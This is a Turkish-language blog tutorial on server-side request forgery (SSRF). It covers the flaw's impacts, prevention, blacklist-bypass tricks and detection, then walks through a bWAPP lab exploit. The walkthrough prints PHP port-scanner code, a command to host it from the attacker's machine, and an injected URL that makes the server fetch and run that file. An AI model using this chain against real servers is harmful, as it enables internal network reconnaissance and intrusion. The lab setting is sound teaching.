---
title: "Server Side Request Forgery (SSRF) Nedir? Nasıl Önlem Alınır?"
author: Mümin Köykıran
date: "2021-07-16"
categories: 
  - "Siber Güvenlik"
  - "Web Güvenliği"
tags: 
  - "penetrasyon-testi"
  - "pentest"
  - "server-site-request-forgery"
  - "ssrf"
  - "ssrf-zafiyeti"
  - "xss"
  - "zafiyet"
image:
  src: /asset/server-side-request-forgery-ssrf-nedir/ssrf.jpg
---

Merhabalar, bu yazımda sizlere Server Side Request Forgery yani literatürde geçen kısaltmasıyla SSRF nedir? Nasıl kötüye kullanılır? Etkileri nelerdir? Nasıl önlem alınır? Bunlara değineceğiz.

Web uygulamalarında belirli bir kaynaktan dosya, url çekme gibi işlemlerde bu gibi zafiyetler ortaya çıkabilir. Web uygulaması kullanıcıya bir dosyayı, bir style kaynağını paylaştığı durumlarda olabilir. Bazı durumlarda web uygulaması yazılım güncellemesi gibi sebeplerle de uzak kaynakları alma veya url gibi kaynaklardan içerik aldıklarında güvenlik implementasyonlarına çok dikkat edilmeli. Eğer bu çalışmalar doğru yapılmazlar ise SSRF zafiyetleri doğmaktadır.

## SSRF Nedir?
SSRF kısaltmasının açılımı Server Side Request Forgery, Türkçe karşılığı olarak sunucu taraflı istek sahteciliğidir. En temel ifadesiyle kötü niyetli kişi; hedef sunucuya giden istekleri, zafiyetli olan web uygulamasındaki istekleri manipüle ederek isteklerin varış noktalarını değiştirmektedir. Çıkış sebebi ise uygulamanın geliştirilmesi sırasında uzak kaynakların çağrılmasına izin verilen domainlerin ve protokollerin gerekli denetimden geçmemiş olmasıdır.

SSFR zafiyetinin tehlikeli tarafı, kullanılarak diğer tehlikeli zafiyetlere yükseltme işlemi yapılıyor olmasıdır. SSFR zafiyeti saldırıları kullanılarak aşağıdaki durumları gerçekleştirmek mümkündür.

## SSRF Zafiyetinin Etkileri
* Intranet veya public bir ağdan normal olarak erişilemeyen iç ağlarda port servis vb. keşif ve saldırı işlemleri,
* Siteler arası betik çalıştırma, (SSRF to Reflected XSS)
* Server içerisinde uzaktan kod çalıştırma, (SSRF to RCE)
* Sunucuda kritik dosyaların içeriğinin okunması, (SSRF to LFI)
* URL şemaları kullanarak sunucuya işlem yaptırılması, (ftp://, dict://, http://, gopher://, file:// vb.)
* Cloud servislerin meta-data bilgilerinin çekilmesi,
* Whitelist ve DNS çözümlemelerinin aşılması gibi faaliyetler de bulunulabilir.

## SSRF Zafiyetinin Önlenmesi
Öncelikle kullanıcıdan veri alan tüm noktalar çok detaylı bir şekilde kontrol edilmelidir. Kullanıcıdan gelen her şey zararlı olabilme ihtimaline dayanarak göz önünde bulundurulmalıdır. SSRF zafiyetini önlemek için, server tarafından uzak kaynakları çağırmasına izin verilen domainlerin ve bu protokollerin whitelist yöntemi kullanılmalıdır.

Bununla birlikte server tarafından kullanıcıdan gelen veri girdisinin, server dışına doğrudan yapılabilecek isteklerde kullanılmaması önerilir. Ayrıca kullanıcı verilerini filtrelenmesi de şiddetle önerilir. Fakat bu yöntemde çok fazla esnek davranmak gerekir bunun nedeni olabilecek tüm senaryoları baz alıp buna yönelik bir filtre yapmak neredeyse imkansızdır. Bu sebeple bu durumunu pratikte uygulamak oldukça zordur.

Durumun zorluğunu anlatabilmek adına aşağıdaki durumunu ele alalım.

* Dahili bir ağdaki IP adresine çevirilecek olan IP adreslerini encode edilmiş şekilde kullanabilir.
* 1 -> localhost ile aynı
* 123.123.123 -> localhost ile aynı
* Dahili IP adreslerine host isimleri sağlayabilir.
* Hostname’in sonuna nokta koyarak blacklist bypass edebilir.
Bu ve daha fazlası olacak şekilde bir çok bypass yöntemi bulunmaktadır. Bu nedenle sunucu adına istekte bulunan işlevlerde kullanıcı girişini önlemek en sağlıklı olacaktır.

## Web Uygulamalarında SSRF Zafiyetlerini Tespit Etmek
Web uygulamalarında SSRF zafiyetini tespit etme işlemi için otomatize araçlar (Acunetix, Netsparker vb.) kullanılması önerilir. Yada yarı otomatik scriptler kullanılarak belirli algoritmik mantıklar ile kullanıcıdan alına tüm input alanlarının teste tabi tutulması gerekir.

Buraya kadar olabilecek tüm konuları ele aldığımıza göre SSRF zafiyetini daha iyi anlamak adına aşağıdaki örneğimizi inceleyelim. bWAPP (buggy web application) üzerinde bir SSRF zafiyetinin kullanımını takip edelim.

![](/asset/{{page.id | replace:'/posts/',''}}/bwaapp.png)
**

bWAPP üzerinde SSRF Sekmesinde bu zafiyeti RFI sekmesi üzerinden SSRF kullanarak Port taraması yapmamızı istemekte. Port scan kısmına tıklarsanız size bu işlemi yapabilecek php kodlarını vermektedir. İsterseniz o url üzerindende tetikleyebilirsiniz. Fakat kendiniz o dosyayı indirip kendi atacker ipnizden ya da bir site üzerine yükleyerek tetikleyebilirsiniz.

![](/asset/{{page.id | replace:'/posts/',''}}/bwaapp-code.png)
**

Port scan sözcüğünün üzerine tıkladığınız açılan sayfa bu şekildedir. Şimdi bu kodu kopyalayarak atak yaparken kullanacağınız pc nin Desktop ına dosya oluşturarak yapıştırınız.

``` PHP
<?php
if(isset($_REQUEST["ip"]))
{
    //list of port numbers to scan
    $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);
    $results = array();
    foreach($ports as $port)
    {
        if($pf = @fsockopen($_REQUEST["ip"], $port, $err, $err_string, 1))
        {
            $results[$port] = true;
            fclose($pf);
        }
        else
        {
            $results[$port] = false;        
        }
    }
 
    foreach($results as $port=>$val)
    {
        $prot = getservbyport($port,"tcp");
        echo "Port $port ($prot): ";

        if($val)
        {
            echo "<span style=\"color:green\">OK</span><br/>";
        }
        else
        {
            echo "<span style=\"color:red\">Inaccessible</span><br/>";
        }
    }
}
?>
```

Benim düzenlediğim dosya burada bWAPP üzerindeki dosyada XSS payloadıda bulunmaktaydı fakat onu çıkarttım denemek isteyenler o satırı ekleyebilirler. Şimdi bu kodu masaüstümüzde ssrf.txt adında bir dosya açıp içine yapıştırıyoruz.

![](/asset/{{page.id | replace:'/posts/',''}}/simplehttpserver.png)
**

Burda gördüğünüz işlem kendi makinamın Desktop dizinini kendi ip adresim üzerinden 8000 portu ile dışarıya açmama yarayan komuttur.

python -m SimpleHTTPServer PortNo
şeklindedir. Artık gelelim SSRF açığını kullanarak port tarama saldırımıza.

*http://192.168.2.35/bWAPP/rlfi.php?language=lang_en.php&action=go* normal  urlimizi bu fakat biz bu urlde language parametresinde biraz önce düzelttiğimiz ve yayına açtığımız ssrf.txt dosyasının urlini giriyoruz. Ve bunun önüne kendimiz bir ip parametresi tanımlıyoruz ve portlarını taranacak ip adresini giriyoruz. Bu ip adresi bWAPP ın kurulu olduğu sunucunun ipsi bu örneğimizde. Gördüğünüz gibi atak başarılı bir şekilde gerçekleşti ve port tarama sonuçları önümüze geldi. *http://192.168.2.35/bWAPP/rlfi.php?ip=192.168.2.35&language=http://192.168.2.228:8000/ssrf.txt&action=go*

![](/asset/{{page.id | replace:'/posts/',''}}/bwapp-apple.png)
**

Bu şekilde SSRF açıklığı bulunan bir sistemde proxy olarak kullanarak internal networke ulaşıp oradada keşif ve port taraması yapabilmek mümkündür.

## Reference

* https://kernelblog.org/2018/03/ssrf-guvenlik-zafiyeti-nedir/
* https://bksecurity.org/ssrf/
* https://gurelahmet.com/ssrf-server-side-request-forgery-zafiyeti/
* https://www.netsparker.com.tr/blog/web-guvenligi/ssrf-nedir-ssrf-nasil-onlenir/
* https://gaissecurity.com/bilgi/ssrf-server-side-request-forgery/
* https://medium.com/@ahmetumitbayram/server-side-request-forgery-sunucu-tarafl%C4%B1-i%CC%87stek-sahtecili%C4%9Fi-nedir-2d006d914799